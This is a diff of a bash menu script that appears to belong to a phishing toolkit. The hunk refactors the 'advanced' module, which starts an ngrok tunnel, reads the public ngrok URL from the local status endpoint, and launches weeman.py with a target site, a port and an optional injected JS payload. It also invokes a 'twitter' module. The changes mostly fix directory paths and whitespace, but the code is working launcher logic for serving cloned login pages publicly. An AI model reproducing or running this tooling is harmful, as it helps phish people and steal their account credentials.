@@ -93,28 +93,28 @@ while IFS= read -e -p "$( echo -e $white ; echo -e ${grayterm}{REBEL}➤[${white
        elif [[ $module == "twitter" ]] ; then
            echo -e "7" | python main.py 
        elif [[ $module == "advanced" ]] ; then
+           if ! [[ $(pwd) =~ "weeman_mod" ]] ; then
+              cd weeman_mod
+           fi
            if [[ $ngrok_url == "on" ]] ; then
-              ./Server/ngrok ./ngrok http $port > /dev/null & 
-              sleep 10 
+              ../Server/ngrok http $port > /dev/null &
+              sleep 10
               ngrok=$( curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh )
 	      echo -e "${red}[*] Ngrok URL : $ngrok "
-              cd weeman_mod
               if [[ $js == "nul" ]] ; then
-                  python weeman.py $site $port $ngrok 2> /dev/null 
+                  python weeman.py $site $port $ngrok 2> /dev/null
               else
                   python weeman.py $site $port $ngrok $js 2> /dev/null
-              fi    
+              fi
            else
-              cd weeman_mod
               if [[ $js == "nul" ]] ; then
                   python weeman.py $site $port 2> /dev/null
               else
                   python weeman.py $site $port $js 2> /dev/null
-              fi  
+              fi
            fi
-	   cd ..
        fi
     else
        misc $cmd1
-    fi   
-done    
+    fi
+done
